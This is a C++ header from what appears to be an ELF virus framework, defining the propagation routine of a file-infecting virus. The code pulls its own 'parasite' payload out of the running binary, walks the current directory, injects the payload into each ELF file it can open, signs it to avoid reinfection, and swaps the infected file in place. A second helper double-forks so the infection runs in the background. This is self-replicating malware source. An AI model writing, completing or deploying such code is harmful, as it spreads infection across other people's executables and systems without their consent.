#pragma once

#include "common/double_fork.hh"
#include "common/get_symbol_addr.hh"
#include "common/mmap.hh"
#include "infector/common_infection.hh"
#include "nostdlib/stdlib.hh"
#include "nostdlib/string.hh"
#include "nostdlib/sys/wait.hh"
#include "nostdlib/unistd.hh"
#include "signature/elf_padding.hh"

namespace vf::propagation {
// Propagate the injected code from the current program to all binaries into
// others. This function only injects into elfs (not self) without signature
// checking. The current program must have appropriate file system permission.
// This function must be invoked inside a virus, otherwise the linker will
// complain.
// @Tparam DirIteratorT A directory iterator that provides victim file paths.
// @Tparam Injector     A code injector.
// @Tparam Redirector   A redirector.
// @returns number of successful infection.
template <typename DirIteratorT, typename Injector, typename Redirector>
size_t propagate() {
  size_t num_infections = 0;

  // Extract the virus from the current binary.
  std::span<const std::byte> parasite(vf::common::get_parasite_start_address(),
                                      vf::common::get_parasite_len());
  char dir[] = {'.', 0};

  for (auto it : DirIteratorT(dir)) {
    if (it.type == DirIteratorT::EntryType::FILE) {
      auto host_path = common::String(it.dir_path) + '/' + it.name;
      auto host = vf::common::FileDescriptor(host_path.c_str(), O_RDONLY);
      if (!host.valid()) {
        continue;
      }

      auto host_size = host.file_size();
      if (host_size == 0) {
        continue;
      }

      vf::common::Mmap<PROT_READ> host_mapping(host_size, MAP_PRIVATE,
                                               host.handle(), 0);

      std::span<const std::byte> host_span(host_mapping.base(),
                                           host_mapping.size());

      char tmp[PATH_MAX];
      auto len = vf::strlen(host_path.c_str());
      vf::strcpy(tmp, host_path.c_str());
      tmp[len] = '.';
      tmp[len + 1] = '\0';

      auto new_host = vf::infector::infect<Injector, Redirector,
                                           signature::ElfHeaderPaddingSigner>(
          host_span, parasite, tmp,
          vf::common::get_patch_return_offset_from_parasite_start());
      if (!new_host.valid()) {
        continue;
      }

      if (!vf::infector::atomic_swap_host(host.handle(), host_path.c_str(),
                                          new_host.handle(), tmp)) {
        // may fail due to lack of permission.
        (void)vf::unlink(tmp);
      } else {
        num_infections++;
      }
    }
  }
  return num_infections;
}

// With large tree walks infection can take too long. The following helper
// allows tree walks to happen in a forked process.
template <typename DirIteratorT, typename Injector, typename Redirector>
void forked_propagate() {
  common::double_fork(
      []() { propagate<DirIteratorT, Injector, Redirector>(); });
}

}  // namespace vf::propagation